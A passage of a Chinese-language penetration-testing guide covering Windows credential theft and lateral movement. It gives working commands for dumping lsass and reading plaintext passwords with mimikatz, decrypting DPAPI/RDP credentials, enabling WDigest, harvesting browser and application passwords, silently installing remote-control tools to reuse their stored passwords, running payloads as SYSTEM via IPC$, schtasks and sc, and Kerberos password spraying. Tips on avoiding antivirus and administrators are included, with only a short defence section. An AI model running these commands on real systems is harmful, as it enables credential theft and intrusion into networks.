通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br></pre></td></tr></table></figure>\n<h4 id=\"离线读取\"><a class=\"markdownIt-Anchor\" href=\"#离线读取\">#</a> 离线读取</h4>\n<p>1. 导出 lsass 文件</p>\n<p>1、使用任务管理器导出（windows NT 6）需要有远程桌面</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206170800142.png\" alt=\"image-20221206170800142\"></p>\n<p>2. 使用 procdump 导出 lsass.dmp 文件</p>\n<p>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows 任务管理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>\n<p>3. 使用 PowerSploit 的 Out-MiniDump 模块，PowerSploit 是一个基于 Powershell 的渗透工具包，可以选择创建进程的完整内存转储。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9FeGZpbHRyYXRpb24vT3V0LU1pbmlkdW1wLnBzMQ==\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206171322063.png\" alt=\"image-20221206171322063\"></p>\n<p>4.comsvcs.dll，系统自带。通过 comsvcs.dll 的导出函数 MiniDump 实现 dump 内存</p>\n<p>首先查看 lsass.exe 进程 PID: tasklist | findstr lsass.exe</p>\n<p>使用 powershell 导出 rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 488 C:\\lsass.dmp full</p>\n<p>读取 dump 文件</p>\n<p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full”</p>\n<h3 id=\"使用hashcat\"><a class=\"markdownIt-Anchor\" href=\"#使用hashcat\">#</a> 使用 hashcat</h3>\n<p>Hashcat 是一个密码恢复工具。直到 2015 年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。</p>\n<p>下载地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXNoY2F0Lm5ldC9oYXNoY2F0Lw==\">https://hashcat.net/hashcat/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 1000 NTLM HASH 字典 ‐‐force</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NtZDUuY29t\">cmd5.com</span></p>\n<h3 id=\"浏览器-数据库等其他密码的抓取\"><a class=\"markdownIt-Anchor\" href=\"#浏览器-数据库等其他密码的抓取\">#</a> <strong>浏览器、数据库等其他密码的抓取</strong></h3>\n<p><strong>BrowserGhost 浏览器抓取</strong></p>\n<p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下：实现 system 抓机器上其他用户的浏览器密码 (方便横向移动时快速凭据采集)</p>\n<p>用.net2 实现可兼容大部分 windows，并去掉依赖 (不需要 System.Data.SQLite.dll 这些累赘) 可以解密 chrome 全版本密码 (chrome80 版本后加密方式变了)</p>\n<p>Chrome 已经可以获取 login data、cookie、history、book 了</p>\n<p>BrowserGhost.exe</p>\n<p><strong>Sharp-HackBrowserData 浏览器</strong></p>\n<p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi 等常见的浏览器都能抓</p>\n<p>Sharp-HackBrowserData.exe</p>\n<p><strong>SharpDecryptPwd 数据库</strong></p>\n<p>SharpDecryptPwd-master 对密码已保存在 Windwos 系统上的部分程序进行解析，包 Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SharpDecryptPwd.exe ‐TeamViewer</span><br><span class=\"line\">SharpDecryptPwd.exe ‐FileZilla</span><br><span class=\"line\">SharpDecryptPwd.exe ‐WinSCP</span><br><span class=\"line\">SharpDecryptPwd.exe ‐Xmangager ‐p Session_Path</span><br></pre></td></tr></table></figure>\n<p><strong>LaZagne 各类密码</strong></p>\n<p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。</p>\n<p>命令：laZagne.exe all</p>\n<h3 id=\"抓取ntlm-hash\"><a class=\"markdownIt-Anchor\" href=\"#抓取ntlm-hash\">#</a> 抓取 ntlm hash</h3>\n<p><strong>getpassword</strong></p>\n<p>打开 GetPass 工具所在的目录。打开命令行环境。运行 64 位程 GetPassword。运行该程序后，即可获得明文密码</p>\n<p><strong>pwdump7</strong></p>\n<p>在命令行环境中运行 PwDump7 程序，可以得到系统中所有账户的 NTLMHash</p>\n<p><strong>QuarksPwDump</strong></p>\n<p>下载 QuarksPwDump.exe, 在命令行环境中输人 QuarksPwDump.exe --dump-hash-local 导出三个用户的 NLMHash</p>\n<p><strong>nishang</strong></p>\n<p>nishang 中的 GET-PASSHashes.ps1 可以可以获取 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import‐Module .\\Get‐PassHashes.ps1</span><br><span class=\"line\">Get‐PassHashes</span><br></pre></td></tr></table></figure>\n<p><strong>wce</strong></p>\n<p>这款工具是一款 Hash 注入神器，不仅可以用于 Hash 注入，也可以直接获取明文或 Hash。这款工具也分为 32 位和</p>\n<p>64 位两个不同的版本：</p>\n<h3 id=\"windows-rdp凭证的抓取和密码破解\"><a class=\"markdownIt-Anchor\" href=\"#windows-rdp凭证的抓取和密码破解\">#</a> <strong>Windows RDP 凭证的抓取和密码破解</strong></h3>\n<p>Credentials 的解密是 Windows 系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解为密码），接下来我们就讲解 RDP 凭证的抓取和破解</p>\n<p>在我们点击保存密码后，Windows 就通过 MasterKey 将我们的密码加密后保存在本地，由于 Windows 还需要解密从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到 MasterKey 就能将密码解出来</p>\n<p>查看凭证命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看mstsc的连接记录</span><br><span class=\"line\">cmdkey /list</span><br><span class=\"line\">查找本地的Credentials</span><br><span class=\"line\">dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207160748531.png\" alt=\"image-20221207160748531\"></p>\n<h4 id=\"在线破解\"><a class=\"markdownIt-Anchor\" href=\"#在线破解\">#</a> 在线破解</h4>\n<p>1、使用 mimikatz 获取该文件的 MasterKey 的 guid</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz dpapi::cred /in:C:\\Users\\Administrator\\appdata\\local\\microsoft\\credentials\\FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>2、找到内存中对应的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>3、最后打开 mimikatz 通过 MasterKey 值去解密凭据文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:凭据文件路径 /masterky:masterkey值</span><br></pre></td></tr></table></figure>\n<p><strong>离线破解</strong></p>\n<p>由于我们不能保证我们的 mimikatz 是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目的其实很简单，就是把目标的文件和内存下载回来，在 vps 或本机上进行 mimikatz 解密即可。</p>\n<p>1、下载目标内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump 导出lsass</span><br></pre></td></tr></table></figure>\n<p>2、下载目标的 Credentials 文件</p>\n<p>3、用 mimikatz 载入 dump 回来的内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sekurlsa::minidump lsass1.dump</span><br></pre></td></tr></table></figure>\n<p>4、获取 Credentials 的 GUID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>5. 获取内存中所有的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>6、利用 MasterKey 解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c</span><br></pre></td></tr></table></figure>\n<h3 id=\"winser-2012r2之后抓密码方式\"><a class=\"markdownIt-Anchor\" href=\"#winser-2012r2之后抓密码方式\">#</a> winser - 2012R2 之后抓密码方式</h3>\n<p>在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p>\n<p><strong>修改注册表和锁屏</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 开启</span><br><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<p>锁屏后重新输入密码在 lsass 中才会再次存储明文密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rundll32.exe user32.dll,LockWorkStation 锁屏</span><br><span class=\"line\">query user 查询登录</span><br><span class=\"line\">logoff ID 下载</span><br></pre></td></tr></table></figure>\n<h3 id=\"防范\"><a class=\"markdownIt-Anchor\" href=\"#防范\">#</a> 防范</h3>\n<p><strong>2012R2 域控设置</strong></p>\n<p>在 windows server 2012 R2 中，新增了一个 Protected Users 安全组，将用户加入到该组，用户的明文密码就不会被获取</p>\n<p><strong>安装 KB2871997</strong></p>\n<p>2014 年，Microsoft 发布了 KB2871997 补丁，它主要囊括了 Windows 8.1 和 Windows Server 2012 R2 中增强的安全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2 和 Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止” 哈希传递 “的攻击方式，但其确实有助于是 Windows 免受一些常见的攻击，例如：明文密码脱取、RDP 凭据盗取、盗取本地 Administrator 账户进行横向移动。</p>\n<p>修改注册表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<h2 id=\"横向\"><a class=\"markdownIt-Anchor\" href=\"#横向\">#</a> 横向</h2>\n<h3 id=\"向日葵内网横向\"><a class=\"markdownIt-Anchor\" href=\"#向日葵内网横向\">#</a> 向日葵内网横向</h3>\n<p>向日葵远程控制软件是一款免费的集远程控制电脑 / 手机 / 平板、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件，且还能进行远程文件传输、远程摄像头监控等。</p>\n<p>支持系统：Winodws/Linux/MacOS/Android/iOS</p>\n<p>使用注册注册表的方式进行绕过，注册表文件如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\">[HKEY_CURRENT_USER\\SOFTWARE\\Oray\\SunLogin\\SunloginClient]</span><br><span class=\"line\">&quot;11.1.0.37237_IsRunSeted&quot;=&quot;1&quot;</span><br></pre></td></tr></table></figure>\n<p>将以上的代码保存为，xxx.reg 如（1.reg）</p>\n<p>运行注册注册表的命令和运行向日葵</p>\n<p>查看向日葵配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\ProgramData\\Oray\\SunloginClient\\config.ini</span><br><span class=\"line\">fastcode：本机识别码去掉k</span><br><span class=\"line\">encry_pwd：本机验证码，密文无法直接解密</span><br></pre></td></tr></table></figure>\n<h3 id=\"todesk内网横向\"><a class=\"markdownIt-Anchor\" href=\"#todesk内网横向\">#</a> todesk 内网横向</h3>\n<p>ToDesk 是一款类似向日葵的远程控制软件，但比向日葵、TV 和 AD 更为流畅和稳定，它同样具备着内网穿透、文件传输、云端同步和流量加密等功能</p>\n<p>有绿色精简版和全功能版两个版本，支持的系统有：Winodws/Linux/MacOS/Android/iOS</p>\n<p>全功能版在双击运行、命令行执行时都会出现 UAC 弹窗和安装界面，这样非常容易被管理员发现，/S 参数可以实现静默安</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ToDesk1.exe /S</span><br></pre></td></tr></table></figure>\n<p>安装完成后自动运行，接下来查看配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\&quot;Program Files (x86)&quot;\\ToDesk\\config.ini</span><br></pre></td></tr></table></figure>\n<p>运行 ToDesk 后会在默认安装目录下生成一个 confifig.ini 配置文件，存储的有设备代码、临时密码、安全密码以及登录用户和密码等重要敏感信息，但密码都经过 ToDesk 特有加密算法加密，所以不能通过解密得到明文密码，只需要找到目标主机 ToDesk 中的 tempAuthPassEx 临时密码或 authPassEx 安全密码，将它们覆盖到我们本地 ToDesk 中的 tempAuthPassEx，重启 ToDesk 即可得到明文密码</p>\n<p>使用 cs 进行文件替换</p>\n<p>重启程序就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklis 查找进程</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /pid 2484 /F</span><br><span class=\"line\">taskkill /pid 2212 /F</span><br></pre></td></tr></table></figure>\n<p>重新开启</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell C:\\&quot;Program Files (x86)&quot;\\ToDesk\\ToDesk.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用远控工具gotohttp横向移动\"><a class=\"markdownIt-Anchor\" href=\"#利用远控工具gotohttp横向移动\">#</a> <strong>利用远控工具 GoToHTTP 横向移动</strong></h3>\n<p>GotoHTTP 工作在 B2C 模式。使用远程控制时，您不必在每一台电脑上都安装远程软件。不管身处何处，有浏览器就能访问远程电脑。 即使公司网络管控，仍然可以控制或被控制。支持文件传输、无人值守、剪切板同步、远程语音、远程摄像头、多显示器支持</p>\n<p>运行该文件</p>\n<p>在运行目录下会生成一个配置文件</p>\n<p>查看配置文件里面有连接地址和账号密码</p>\n<p>使用网页连接</p>\n<h3 id=\"rustdesk\"><a class=\"markdownIt-Anchor\" href=\"#rustdesk\">#</a> rustdesk</h3>\n<p>远程桌面软件，开箱即用，无需任何配置，完美替代 TeamViewer。您完全掌控数据，不用担心安全问题。您可以使用我们的注册 / 中继服务器，或者自己设置，亦或者开发您的版本。</p>\n<p>上传到目标机器</p>\n<p>运行程序</p>\n<p>找到配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\用户名\\AppData\\Roaming\\RustDesk\\config</span><br></pre></td></tr></table></figure>\n<p>可以看到没有密码，这个时候需要手写这个密码，然后重启工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">taskkill /pid 2988 /F</span><br></pre></td></tr></table></figure>\n<p>查看密码已经可以了</p>\n<p>连接目标</p>\n<h3 id=\"ipc横向\"><a class=\"markdownIt-Anchor\" href=\"#ipc横向\">#</a> IPC 横向</h3>\n<p>IPC (Internet ProcessConnection) 共享 “命名管道” 的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算 机的共享资源时使用。</p>\n<p>通过 ipc$, 可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列 表等信息。</p>\n<p><strong>mimikatz 抓取密码如果只是管理员组的用户需要绕过 UAC</strong></p>\n<p>首先，需要建立一个 ipc$</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.30\\ipc$ &quot;密码&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 利用条件</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、开启了139、445端口</span><br><span class=\"line\">ipcs可以实现远程登录及对默认共享资源的访问,而139端口的开启表示NetBIOS协议的应 用。通过139、445( Windows2000)端口,可以实现对共享文件打印机的访问。因此,一般来讲,ipcs需要139、445端口的支持。</span><br><span class=\"line\">2、管理员开启了默认共享</span><br><span class=\"line\">默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$等和系统目录winnt或 windows( adminS)通过ipc$,可以实现对这些默认共享目录的访问</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 连接常见错误</strong></p>\n<blockquote>\n<p>错误号 5: 拒绝访问</p>\n<p>错误号 51: Windows 无法找到网络路径，即网络中存在问题。</p>\n<p>错误号 53: 找不到网络路径，包括 IP 地址错误、目标未开机、目标的 lanmanserver 服务未 启动目标有防火墙 (端口过滤)</p>\n<p>错误号 67: 找不到网络名，包括 lanmanworkstation 服务未启动、ipcs 已被删除</p>\n<p>错误号 1219: 提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了 ipcs, 需要在删除原连接后重新进行连接。</p>\n<p>错误号 1326: 未知的用户名或错误的密码</p>\n<p>错误号 l792; 试图登录，但是网络登录服务没有启动，包括目标 NetLogon 服务未启动（连 接域控制器时会出现此情况）。</p>\n<p>错误号 2242: 此用户的密码已经过期 ° 例如’目标机器设置了账号管理策略，强制用户定 期修改密码</p>\n</blockquote>\n<p><strong>如果两端用户名密码都一样，比如都是 administrator，且密码都一样，可以直接建立 ipc</strong></p>\n<p><strong>利用方式 - windows 自带命令</strong></p>\n<p><strong>dir 命令</strong></p>\n<p>在使用 netuse 命令与远程目标机器建立 ipcs 后，可以使用 dir 命令列出远程主机中的文件，如图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\192.168.18.10\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>tasklist 命令</strong></p>\n<p>在使用 net use 命令与远程目标机器建立 ipcs 后，可以使用 tasklist 命令的 / S、/U/P 参数列 出远程主机上运行的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist /s 192.168.18.10</span><br></pre></td></tr></table></figure>\n<p><strong>利用方式 - schtasks</strong></p>\n<p>1）查看系统时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net time \\\\IP地址</span><br></pre></td></tr></table></figure>\n<p>2）复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 文件 \\\\IP地址\\C$</span><br></pre></td></tr></table></figure>\n<p>3）创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /u  /p  /s IP地址 /tn 计划任务名 /sc onstart /tr c:\\文件 /ru system /f</span><br></pre></td></tr></table></figure>\n<p>4）执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s IP地址 /i /tn &quot;计划任务名&quot;</span><br><span class=\"line\">// 执行成功后以system上线</span><br></pre></td></tr></table></figure>\n<p>5）删除计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /delete /s IP地址 /tn &quot;计划任务名&quot; /f</span><br></pre></td></tr></table></figure>\n<p>6）清除 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\IP /del /y</span><br></pre></td></tr></table></figure>\n<h3 id=\"ipc配合系统服务横向移动\"><a class=\"markdownIt-Anchor\" href=\"#ipc配合系统服务横向移动\">#</a> <strong>IPC 配合系统服务横向移动</strong></h3>\n<p><strong>SC 命令详解</strong></p>\n<p>获取到密码并着手横向时，却发现 Task Sheduler 服务没有启用。这时候我们就可以远程建立服务，后再启用服务来运行我们想要运行的命令。</p>\n<p>IPC 建立连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.40\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy C:\\Users\\Administrator\\Desktop\\wanli.exe \\\\192.168.41.40\\C$</span><br></pre></td></tr></table></figure>\n<p>创建服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.41.40 create test binpath= &quot;cmd.exe /c c:\\wanli.exe&quot;</span><br></pre></td></tr></table></figure>\n<p>开启服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 start test</span><br></pre></td></tr></table></figure>\n<p>删除服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>\n<p>上线机器</p>\n<h3 id=\"password-spraying密码喷洒攻击和域内用户枚举横向移动\"><a class=\"markdownIt-Anchor\" href=\"#password-spraying密码喷洒攻击和域内用户枚举横向移动\">#</a> <strong>Password Spraying 密码喷洒攻击和域内用户枚举横向移动</strong></h3>\n<p><strong>域内用户枚举攻击原理</strong></p>\n<p>正常域用户登录主机，我们可以通过 &quot;net user /domain&quot; 来列举出域内的用户。但是当我们用非域用户进行登录时，是不能使用 &quot;net user /domain&quot; 这条命令的。或者当主机不在域内但是能与域控通信时，以上两种情况我们可以通过以下方法对域内用户进行枚举。</p>\n<p>Kerberos 本身是一种基于身份认证的协议，在 Kerberos 协议认证的 第一阶段 AS-REQ ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP 的返回包不一样。所以可以利用这点，对域内进行域用户枚举和密码喷洒攻击。在 AS-REQ 阶段客户端向 AS 发送用户名，AS 对用户名进行验证，用户存在和不存在返回的数据包不一样，所以，根据 AS 的返回包来对域用户进行枚举</p>\n<p><strong>枚举工具介绍</strong></p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br></pre></td></tr></table></figure>\n<p><strong>密码喷洒攻击原理</strong></p>\n<p>在确认用户存在后，客户端又会发送一个 AS-REQ 请求，如果密码正确，则返回 AS-REP。否则返回 KRB5KDC_ERP_PREAUTH_FAILED，</p>\n<p>在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是<strong>先用一个密码去碰撞很多账号</strong>，此方法能有效的避免账号被锁定的问题</p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe passwordspray -d hack.com 1.txt Admin@123</span><br></pre></td></tr></table></figure>\n<p><strong>CrackMapExec</strong></p>\n<p>CrackMapExec（⼜名 CME）是⼀款⾮常好⽤的密码喷洒攻击的⼯具，在 Kali Linux 默认已经安装好。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.41.10 -u 1.txt -p &#x27;Admin@123&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>\n<p>使用前提：设置代理 将 192.168.41.10 的流量代理到 kali 上</p>\n<p><strong>DomainPasswordSpray.ps1</strong></p>\n<p>必须是域内用户才可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserList：用户字典</span><br><span class=\"line\">Password：单个密码</span><br><span class=\"line\">PasswordList：密码字典</span><br><span 